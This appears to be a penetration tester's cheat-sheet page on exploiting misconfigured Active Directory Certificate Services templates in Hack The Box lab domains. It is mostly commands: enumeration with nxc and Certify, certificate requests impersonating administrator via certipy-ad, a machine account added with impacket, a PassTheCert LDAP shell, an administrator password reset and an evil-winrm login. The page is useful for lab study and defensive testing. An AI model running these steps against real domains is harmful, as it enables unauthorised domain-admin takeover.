# Active Directory Certificate Services (ADCS)

<details>

<summary>What is it?</summary>

* Relies on **misconfigured certificate templates** that allow low-privileged users to enroll for certificates --> used to get Kerberos tickets for higher-privileged accounts

</details>

<details>

<summary>Finding if ADCS is present in domain</summary>

```
nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
.\Certify.exe cas
```

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Exploitation (Enrollment Rights: Domain Users)</summary>

```bash
# Identify Vulnerable Templates:
.\Certify.exe find /vulnerable
```

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```bash
# Use certipy-ad to request a certificate for domain admin
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -dc-ip 10.10.11.202
```

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

```bash
# Download on Kali
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py

# Seperate into key and certificate files
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt

# Passthecert using ldap-shell option
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain sequel.htb -dc-ip 10.10.11.202
whoami
change_password administrator P@ssw0rd123!

evil-winrm -i dc.sequel.htb -u administrator
```

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Exploitation (Enrollment Rights: Domain Computers)</summary>

<figure><img src=".gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

```bash
# Find vulnerable certificates templates
.\Certify.exe find /vulnerable

# Checking MachineAccountQuota for svc_ldap (to add new computers)
nxc ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq

# Add new computer:
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' htb/svc_ldap  -dc-ip 10.10.11.222

# Request certificate:
certipy-ad req -u 'myComputer$'@authority.htb -p h4x -upn administrator@authority.htb -target authority.htb -ca AUTHORITY-CA -template CorpVPN -dc-ip 10.10.11.222

# Save into key and certificate files:
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt

# Use Pass-the-cert to obtain a LDAP shell:
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
whoami
change_password administrator P@ssw0rd123!

evil-winrm -i 10.10.11.222 -u administrator
```

</details>
